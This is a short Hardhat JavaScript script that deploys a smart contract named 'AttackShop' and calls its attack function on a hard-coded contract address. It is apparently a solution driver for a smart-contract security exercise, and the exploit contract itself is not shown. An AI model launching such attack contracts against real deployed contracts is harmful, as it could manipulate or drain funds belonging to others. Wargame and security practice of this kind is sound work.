
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let provider = ethers.provider;
  const Attack = await hre.ethers.getContractFactory("AttackShop");
  const attack = await Attack.deploy();

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  await attack.attack("0x3a49Bba27763210918Ec1557C43C82f4Dca9cF8c");
  
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
